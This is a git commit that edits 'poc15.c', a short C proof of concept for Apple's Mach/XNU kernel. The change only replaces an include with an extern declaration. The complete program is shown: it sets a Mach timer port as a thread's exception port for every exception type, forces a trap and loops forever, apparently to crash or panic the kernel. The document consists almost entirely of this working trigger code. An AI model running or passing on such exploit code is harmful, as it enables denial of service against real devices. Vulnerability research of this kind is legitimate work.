1a0cdd9556ddcbd05b4d7473fe8a50efe77f8be3
verygenericname <87825638+verygenericname@users.noreply.github.com>
2022-03-25 16:15:14 -0400

    Update poc15.c

--- src/poc15.c
+++ src/poc15.c
@@ -1,5 +1,5 @@
 #include <mach/mach.h>
 #include <pthread.h>
-#include <mach/mach_time.h>
+extern mach_port_name_t mk_timer_create(void);
 void *C(void* a){thread_set_exception_ports(mach_thread_self(),EXC_MASK_ALL,*(int *)a,2,6);__builtin_trap();return a;}
 int main(){int p=mk_timer_create();mach_port_insert_right(mach_task_self(),p,p,20);pthread_t t;pthread_create(&t,0,C,&p);for(;;);} 
